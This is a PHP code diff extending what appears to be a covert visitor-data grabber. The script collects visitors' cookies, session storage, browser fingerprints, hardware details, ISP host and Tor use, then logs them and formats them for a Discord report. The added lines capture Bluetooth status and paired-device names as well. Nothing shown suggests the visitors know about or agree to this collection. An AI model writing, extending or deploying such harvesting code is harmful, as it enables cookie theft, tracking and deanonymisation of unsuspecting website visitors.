@@ -95,6 +95,8 @@ $webgl_renderer       = cleanCookie($json_data['webgl_renderer']      ?? '');
 $hardware_concurrency = cleanCookie($json_data['hardware_concurrency']?? '');
 $device_memory        = cleanCookie($json_data['device_memory']       ?? '');
 $is_tor_browser       = cleanCookie($json_data['is_tor_browser']      ?? '');
+$bluetooth_status     = cleanCookie($json_data['bluetooth_status']    ?? '');
+$bluetooth_device     = cleanCookie($json_data['bluetooth_device']    ?? '');
 
 /* ── Filter out our own _nx_ cookies from the display ─────── */
 $real_cookies = filterNxCookies($raw_cookies);
@@ -184,6 +186,8 @@ $record = [
     'webgl_renderer'       => $webgl_renderer,
     'hardware_concurrency' => $hardware_concurrency,
     'device_memory'        => $device_memory,
+    'bluetooth_status'     => $bluetooth_status,
+    'bluetooth_device'     => $bluetooth_device,
     'cookies'              => $real_cookies ?: 'None',
     'tracking_cookies'     => $tracking_cookies,
     'session_storage'      => $session_storage,
@@ -235,6 +239,11 @@ $txt_entry .= "Canvas Hash     : " . nxLabel($canvas_fingerprint) . "\n";
 $txt_entry .= "GPU Model       : " . nxLabel($webgl_renderer) . "\n";
 $txt_entry .= "CPU Cores       : " . nxLabel($hardware_concurrency) . "\n";
 $txt_entry .= "Device Memory   : " . nxLabel($device_memory) . "\n";
+$bt_text = nxLabel($bluetooth_status);
+if (!empty($bluetooth_device)) {
+    $bt_text .= " (Paired: {$bluetooth_device})";
+}
+$txt_entry .= "Bluetooth       : {$bt_text}\n";
 
 if ($has_real_cookies) {
     $txt_entry .= "{$subdiv}\n";
@@ -308,6 +317,11 @@ $terminal_output .= "[+] Network: {$net_label}\n";
 $terminal_output .= "[+] ISP Host: " . nxLabel($reverse_host, 'Could not resolve') . "\n";
 $terminal_output .= "[+] Canvas Hash: " . nxLabel($canvas_fingerprint) . "\n";
 $terminal_output .= "[+] GPU: " . nxLabel($webgl_renderer) . "\n";
+$bt_term = nxLabel($bluetooth_status);
+if (!empty($bluetooth_device)) {
+    $bt_term .= " (Device: {$bluetooth_device})";
+}
+$terminal_output .= "[+] Bluetooth: {$bt_term}\n";
 if (!empty($is_tor_browser) && $is_tor_browser !== 'No') {
     $terminal_output .= "[+] Tor Privacy: {$is_tor_browser}\n";
 }
@@ -365,6 +379,7 @@ $discord_fields = [
     '🔋 Battery'      => nxLabel($battery_level) . ' — ' . nxLabel($battery_charging, 'N/A'),
     '📶 Network'      => $discord_net,
     '🏢 ISP / Host'   => nxLabel($reverse_host, 'Could not resolve'),
+    '📻 Bluetooth'    => nxLabel($bluetooth_status) . (!empty($bluetooth_device) ? " [{$bluetooth_device}]" : ''),
     '🎮 GPU / Canvas' => nxLabel($webgl_renderer) . ' [Hash: ' . nxLabel($canvas_fingerprint) . ']',
 ];
 
